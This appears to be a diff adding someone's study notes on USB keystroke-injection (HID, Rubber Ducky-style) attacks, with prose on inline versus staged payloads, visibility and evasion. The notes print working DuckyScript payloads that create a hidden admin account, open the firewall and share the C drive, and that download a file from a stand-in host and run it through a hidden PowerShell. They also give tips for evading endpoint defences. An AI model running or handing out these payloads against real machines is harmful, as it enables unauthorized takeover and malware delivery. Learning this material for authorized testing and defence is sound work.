@@ -2,3 +2,79 @@ HID- Human Interface Device.
 A keyboard is an example of this.
 
 A keyboard plugs into the USB.
+With keystroke injection is injected in through the USB port.
+
+The payload may be inline or staged.
+
+An inline payload, often called a single or non-staged payload is designed to carry out the desired task in one, self-contained step.
+They do not rely on any external resource such as a netcat listener or meterpreter handler.
+
+Example of an inline payload to add an admin user and share with it the C drive:
+REM A one-liner to add user "ts" (password "ts")
+REM to the admin group and share the C drive
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -Exec Bypass "saps cmd '/C net User ts ts /ADD&net LocalGroup Administrators ts /ADD&netsh advfirewall firewall set rule group="""File and Printer Sharing""" new enable=Yes&net share ts=c:\ /UNLIMITED&icacls c:* /grant ts:(OI)(CI)F' -Verb RunAs"
+ENTER
+DELAY 1000
+ALT y
+
+A staged payload consists of a stager and one or more stages, typically hosted on external resourceds such as network or mass storage. The stager payload will typically set up a network or file system connection to the staged payload in order for it to be executed.
+
+Once the staged payload has been executed, the USB is often free to be disconnected fomr the target system.
+
+The drawback to a staged payload may be visibility and reliability. Some orgs may have firewalls or intrusion detection systems configured to detect attacks, while other may have policies in place prohibiting certain network connections or even preventing the mounting of external storage.
+
+REM An example staged payload.
+REM This one-liner will download and execute a file hosted online.
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass â€œIEX (New-Object System.Net.WebClient).DownloadFile(â€˜http://example.com/calc.txtâ€™,\â€$env:temp\calc.exe\â€); Start-Process \â€$env:temp\calc.exe\â€â€
+ENTER
+
+Payloads may require external resources, common resources include network, mass storage as well as "out of band" networking.
+
+The previous exaple of the staged payload downloads and executes a binary file hosted from an external network resource. External resources are beneficial, especially as hosts for staged payloads are capable of carrying out complex tasks faster than inline payloads.
+
+But the issue is that they may be blocked or noticced by system administrators.
+
+Example of a staged payload thats hiddien from main storage by the mirco sd storage and is only exposed by the way of a special script "attack mode" command.
+
+REM An example staged payload.
+REM Run staged payload from USB drive with 
+REM the volume label "DUCKY"
+ATTACKMODE HID STORAGE
+DELAY 3000
+GUI r
+DELAY 100
+STRING powershell "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;$m':\p.exe'"
+ENTER
+
+
+visibility:
+
+Factors that impact the visibility of a payload include any on screen elements or visual footprint as well as any actions which may alert IT security teams or create an incident response event.
+An example of a visual footprint may be a large powershell or other command prompt window open during a hotplug attack.
+These viaul elements are often reduced using optimization and obfuscation techniques.
+
+Endpoint device security software and policies may limit a hotplug attacks effectiveness for example, certain commands may be restricted by lower level user accounts.
+
+A network exfiltration payload using an unencrypted ftp connection to a foreign off-site server may be blocked at the perimeter firewall.
+
+Obtaining the following information about the individual target workstations will greatly aid in developing a tailored attack:
+-Operating system (Version and patch level)
+-Keyboard hardware (Manufacturer and model)
+-Uer and permissions and access control mechanisms
+
+A more modern windows target may provide access to advanced powershell features while an older system may rely on classic DOS-style cmd commands.
+
+In mixed environments with multiple ooperating systems in use, be prepared to tailor the payload to use automatic OS detection functions.
+
+Sometimes when you can find out the exact make and model of keyboards used at the facility and you can craft your payload to clone these devices which may assist in evading potential endpoint countermeasures.
+
+It may be beneficial to start a payload assuming a lower privileged account then working up from there.
+
+For physical engagements, its a good idea to have multiple payloads ready for a variety of scenarios. Intelligent payloads which automaticall adapt to the given situation like those using operating system detection are key to successful deployments.
+
